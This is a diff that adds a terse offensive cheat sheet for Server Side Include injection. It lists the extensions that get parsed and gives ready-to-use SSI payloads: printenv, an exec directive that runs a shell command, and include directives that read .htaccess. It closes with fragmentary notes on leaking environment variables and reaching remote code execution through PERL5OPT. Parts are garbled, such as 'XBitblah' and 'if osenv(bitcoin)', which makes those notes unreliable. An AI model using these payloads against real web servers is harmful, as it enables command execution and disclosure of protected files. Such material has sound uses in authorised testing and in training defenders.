@@ -1,0 +1,19 @@
+# Server Side Include (SSI)
+
+default extensions: .shtml, .stm, .shtm
+also server might configured to only parse SSI if .shtml is executable (option XBitblah)
+
+<!--#printenv -->
+<!--#exec cmd="ls" -->
+<!--#include virtual="/.htaccess" --> # relative to webroot, cannot contain ..
+<!--#include file="../../.htaccess" --> # relative to the directory containing the current document being parsed
+<!--#echo var="HTTP_REFERER" -->
+
+* read OS environment variable
+if osenv(bitcoin)
+set
+echo
+
+* rce
+define PERL5OPT=  debug
+then re-read page with virtual=
